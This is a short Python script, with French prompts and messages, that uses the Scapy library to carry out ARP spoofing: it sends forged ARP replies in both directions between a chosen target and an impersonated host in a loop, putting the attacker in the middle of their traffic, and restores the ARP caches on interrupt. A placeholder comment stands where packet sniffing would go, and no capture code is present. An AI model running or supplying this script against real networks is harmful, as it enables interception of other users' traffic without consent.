import time
from scapy.all import ARP, getmacbyip, send, sniff
from scapy.error import Scapy_Exception

def perform_arp_spoofing(target_ip, spoof_ip):
    try:
        target_mac = getmacbyip(target_ip)
        spoof_mac = getmacbyip(spoof_ip)

        packet_arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet_arp, verbose=False)
    except Scapy_Exception as e:
        print(f"Une erreur provenant de Scapy est survenue : {e}")

def restore(target_ip, spoof_ip):
    try:
        target_mac = getmacbyip(target_ip)
        spoof_mac = getmacbyip(spoof_ip)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac), verbose=False)
    except Scapy_Exception as e:
        print(f"Une erreur provenant de Scapy est survenue : {e}")

def main():
    try:
        target_ip = input("Entrez l'adresse IP à écouter : ")
        spoof_ip = input("Quelle adresse IP à usurper : ")

        while True:
            perform_arp_spoofing(target_ip, spoof_ip)
            perform_arp_spoofing(spoof_ip, target_ip)
            time.sleep(1)

    except KeyboardInterrupt:
        print("Capture en cours du trafic")
        
        # Utilisation correcte de la fonction sniff pour avoir les données
        
        print("Rétablissement du cache ARP")
        restore(target_ip, spoof_ip)
        restore(spoof_ip, target_ip)

if __name__ == "__main__":
    main()
